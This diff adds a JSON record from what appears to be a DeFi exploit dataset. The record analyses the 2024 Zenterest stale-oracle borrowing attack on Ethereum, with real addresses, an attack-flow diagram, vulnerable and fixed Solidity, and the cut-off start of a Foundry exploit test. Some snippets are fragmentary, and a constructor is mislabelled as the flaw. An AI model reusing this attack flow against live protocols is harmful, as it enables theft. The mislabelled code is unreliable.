@@ -1,0 +1,30 @@
+{
+ "id": "2024__2024-08-30_Zenterest_StaleOracleBorrow",
+ "source_file": "2024/2024-08-30_Zenterest_StaleOracleBorrow.md",
+ "title": "Zenterest — Over-Borrowing via Stale Price Oracle Analysis",
+ "date": "2024-08-30",
+ "protocol": "Zenterest",
+ "chain": "Ethereum",
+ "loss_raw": "~21,000 USD",
+ "loss_usd": null,
+ "root_cause": "Price oracle returning an outdated price, causing MPH collateral value to be overestimated",
+ "attack_tx": "0xfe8bc757d87e97a5471378c90d390df47e1b29bb9fca918b94acd8ecfaadc598",
+ "vulnerable_contract": "0x4dD6D5D861EDcD361455b330fa28c4C9817dA687 (zenMPH)",
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "❌ Vulnerable pattern: oracle returning a stale price\nfunction getUnderlyingPrice(address cToken) external view returns (uint256) {\n    //",
+  "❌ Cached price is not updated, returning a higher MPH price than actual\n    return cachedPrices[cToken];  // stale value\n}\n\n// Attack flow: stale high MPH price → inflated collateral value → excess WHITE borrowed\nfunction mint(uint256 mintAmount) external {\n    // Collateral value calculated using stale price on MPH deposit\n    uint256 collateralValue = mintAmount * oracle.getUnderlyingPrice(address(this));\n    // → Collateral value assessed higher than actual\n}\n\n//",
+  "// File: CErc20Immutable.sol\ncontract CErc20Immutable is CErc20 {\n    /**\n     * @notice Construct a new money market\n     * @param underlying_ The address of the underlying asset\n     * @param comptroller_ The address of the Comptroller\n     * @param interestRateModel_ The address of the interest rate model\n     * @param initialExchangeRateMantissa_ The initial exchange rate, scaled by 1e18\n     * @param name_ ERC-20 name of this token\n     * @param symbol_ ERC-20 symbol of this token\n     * @param decimals_ ERC-20 decimal precision of this token\n     * @param admin_ Address of the administrator of this token\n     */\n    constructor(address underlying_,\n                ComptrollerInterface comptroller_,\n                InterestRateModel interestRateModel_,\n                uint initialExchangeRateMantissa_,\n                string memory name_,\n                string memory symbol_,\n                uint8 decimals_,\n                address payable admin_) public {\n        // Creator of the contract is admin during initialization\n        admin = msg.sender;\n\n        // Initialize the market\n        initialize(underlying_, comptroller_, interestRateModel_, initialExchangeRateMantissa_, name_, symbol_, decimals_);  // ❌ vulnerability\n\n        // Set the proper admin now that initialization is done\n        admin = admin_;\n    }\n}"
+ ],
+ "code_after": [
+  "✅ Correct code: use up-to-date price via Chainlink\nfunction getUnderlyingPrice(address cToken) external view returns (uint256) {\n    (, int256 price, , uint256 updatedAt,) = AggregatorV3Interface(feed).latestRoundData();\n    require(block.timestamp - updatedAt <= MAX_STALENESS, \"Price too stale\");  //",
+  "✅ freshness check\n    return uint256(price);\n}"
+ ],
+ "steps": [],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1]─► Uniswap V3 Pool flash loan: borrow 85 WHITE\n  │\n  ├─[2]─► Receive 23,200 MPH transferred from privileged address (0x90744C)\n  │\n  ├─[3]─► Call zenMPH.enterMarkets([zenMPH])\n  │\n  ├─[4]─► Transfer 2,000 MPH directly to zenMPH (direct collateral injection)\n  │         └─► zenMPH.mint(21,200 MPH) — collateral value overestimated using stale high price\n  │\n  ├─[5]─► Call zenWHITE.accrueInterest()\n  │\n  ├─[6]─► zenWHITE.borrow(entire WHITE balance of zenWHITE)\n  │         └─► Full balance borrowed successfully thanks to stale MPH price\n  │\n  ├─[7]─► Repay WHITE balance to flash loan pool\n  │\n  └─[8]─► Total loss: ~21,000 USD",
+  "contract ContractTest is Test {\n    Uni_Pair_V3 Pool = Uni_Pair_V3(0xC5c134A1f112efA96003f8559Dba6fAC0BA77692);\n    IERC20 WHITE = IERC20(0x5F0E628B693018f639D10e4A4F59BD4d8B2B6B44);\n    IERC20 MPH = IERC20(0x8888801aF4d980682e47f1A9036e589479e835C5);\n    ICErc20Delegate zenMPH = ICErc20Delegate(0x4dD6D5D861EDcD361455b330fa28c4C9817dA687);\n    ICErc20Delegate zenWHITE = ICErc20Delegate(0xE3334e66634acF17B2b97ab560ec92D6861b25fa);\n\n    function testExploit() external {\n        // Transfer MPH from privileged address (simulation)\n        vm.prank(0x90744C976F69c7d112E8Fe85c750ACe2a2c16f15);\n        MPH.transfer(address(this), 23_200 ether);\n\n        // [1] Flash loan 85 WHITE\n        Pool.flash(address(this), 85 ether, 0, \"\");\n    }\n\n    function uniswapV3FlashCallback(uint256 fee0, uint256,"
+ ]
+}
